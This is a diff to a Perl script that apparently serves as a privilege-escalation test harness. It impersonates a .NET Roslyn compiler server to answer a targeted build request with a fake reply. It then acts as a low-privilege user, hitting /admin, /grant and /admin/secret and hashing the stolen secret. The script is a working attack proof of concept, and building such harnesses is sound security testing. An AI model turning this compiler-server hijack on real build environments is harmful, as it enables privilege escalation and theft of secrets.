@@ -1,6 +1,6 @@
 use strict;
 use warnings;
-use Digest::SHA qw(sha256);
+use Digest::SHA qw(sha256 sha256_hex);
 use Encode qw(encode);
 use Errno qw(ECONNREFUSED);
 use IO::Socket::INET;
@@ -15,7 +15,7 @@ my $mode = $ARGV[0] // 'completed';
 die "MODE must be completed or malformed\n" unless $mode eq 'completed' || $mode eq 'malformed';
 my $port = $ARGV[1] // 0;
 my $compiler_dir = '/usr/share/dotnet/sdk/11.0.100/roslyn/bincore';
-my $input = 'app.False.' . $compiler_dir;
+my $input = $ENV{EOP062_PIPE_INPUT} // ('app.False.' . $compiler_dir);
 my $name = encode_base64(sha256($input), '');
 $name =~ tr|/|_|;
 $name =~ s/=+$//;
@@ -87,8 +87,9 @@ my $client = $server->accept() or die "accept: $!\n";
 my $length = unpack('V', read_exact($client, 4));
 die "invalid request length=$length\n" if $length <= 0 || $length > 4000000;
 my $request = read_exact($client, $length);
+my $target_dir = $ENV{EOP062_TARGET_DIR} // '/src/admin';
 my $target = index($request, encode('UTF-16LE', 'AdminApp')) >= 0 &&
-             index($request, encode('UTF-16LE', '/src/admin')) >= 0;
+             index($request, encode('UTF-16LE', $target_dir)) >= 0;
 print "REQUEST length=$length target=" . ($target ? 1 : 0) . "\n";
 die "non-target request; no fake success sent\n" unless $target;
 
@@ -106,21 +107,51 @@ unlink($global) or die "unlink global after response: $!\n";
 unlink($local) or die "unlink local after response: $!\n";
 
 if ($port) {
-    my $reply;
-    for (1 .. 600) {
-        my $http = IO::Socket::INET->new(PeerAddr => '127.0.0.1', PeerPort => $port,
-                                         Proto => 'tcp', Timeout => 1);
-        if ($http) {
-            write_all($http, "POST /admin HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: 0\r\nConnection: close\r\n\r\n");
-            $reply = <$http>;
-            close($http);
-            last;
+    my $low = $ENV{EOP062_LOW_TOKEN} // die "actor low credential missing\n";
+    sub actor_http {
+        my ($method, $path, $port, $low) = @_;
+        my $http;
+        for (1 .. 600) {
+            $http = IO::Socket::INET->new(PeerAddr => ($ENV{EOP062_VICTIM_HOST} // '127.0.0.1'), PeerPort => $port,
+                                          Proto => 'tcp', Timeout => 1);
+            last if $http;
+            usleep(100000);
         }
-        usleep(100000);
+        die "actor HTTP timeout\n" unless $http;
+        write_all($http, "$method $path HTTP/1.1\r\nHost: 127.0.0.1\r\nAuthorization: Bearer $low\r\nContent-Length: 0\r\nConnection: close\r\n\r\n");
+        my $reply = '';
+        while (1) {
+            my $n = sysread($http, my $part, 8192);
+            die "actor HTTP read failed: $!\n" unless defined $n;
+            last if $n == 0;
+            $reply .= $part;
+        }
+        close($http);
+        my ($status) = $reply =~ /^HTTP\/1\.1\s+(\d+)/;
+        die "actor HTTP missing status\n" unless $status;
+        my ($headers, $body) = split(/\r\n\r\n/, $reply, 2);
+        if (defined($body) && $headers =~ /transfer-encoding:\s*chunked/i) {
+            my $decoded = '';
+            while ($body =~ s/^([0-9a-fA-F]+)\r\n//) {
+                my $n = hex($1);
+                last if $n == 0;
+                die "actor HTTP short chunk\n" if length($body) < $n + 2;
+                $decoded .= substr($body, 0, $n);
+                substr($body, 0, $n + 2, '');
+            }
+            $body = $decoded;
+        }
+        return ($status, defined($body) ? $body : '');
     }
-    die "HTTP timeout\n" unless defined $reply;
-    $reply =~ s/\r?\n$//;
-    print "ACTOR_HTTP_STATUS=$reply\n";
+    my ($before) = actor_http('POST', '/admin', $port, $low);
+    my ($grant) = actor_http('POST', '/grant', $port, $low);
+    my ($after) = actor_http('POST', '/admin', $port, $low);
+    my ($read, $secret_body) = actor_http('GET', '/admin/secret', $port, $low);
+    print "ACTOR_BEFORE_ADMIN=$before\n";
+    print "ACTOR_GRANT=$grant\n";
+    print "ACTOR_AFTER_ADMIN=$after\n";
+    print "ACTOR_SECRET_STATUS=$read\n";
+    print "ACTOR_SECRET_SHA256=" . sha256_hex($secret_body) . "\n" if $read == 200;
 }
 
 print "ACTOR_DONE\n";
